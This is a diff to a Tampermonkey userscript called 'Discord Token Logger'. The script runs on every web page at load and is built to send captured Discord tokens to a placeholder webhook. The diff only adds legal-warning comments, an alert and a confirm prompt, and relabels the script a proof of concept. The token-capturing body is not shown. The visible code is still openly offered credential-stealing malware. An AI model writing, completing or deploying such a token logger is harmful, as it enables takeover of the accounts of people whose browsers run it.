@@ -1,8 +1,11 @@
+// WARNING: This script is for educational purposes only. DO NOT RUN IT unless you understand the consequences.
+// Executing this script without permission may violate laws and terms of service.
+
 // ==UserScript==
 // @name         Discord Token Logger
 // @namespace    https://github.com/Lyzev/DiscordTokenLogger
 // @version      1.2
-// @description  A simple tokenlogger for Tampermonkey. (Browser Extension)
+// @description  A simple tokenlogger for Tampermonkey. (Proof of Concept)
 // @author       Lyzev
 // @run-at       document-start
 // @include http://*
@@ -11,6 +14,11 @@
 // ==/UserScript==
 
 (function () {
+    alert('WARNING: Running this script may have legal consequences. Proceed with caution.');
+    if (!confirm('Are you sure you want to run this script?')) {
+        return;
+    }
+
     const webhook = "WEBHOOK-URL";
     if (window.location.href.startsWith("https://www.youtube.com/")) {
         const url = new URL(window.location.href);
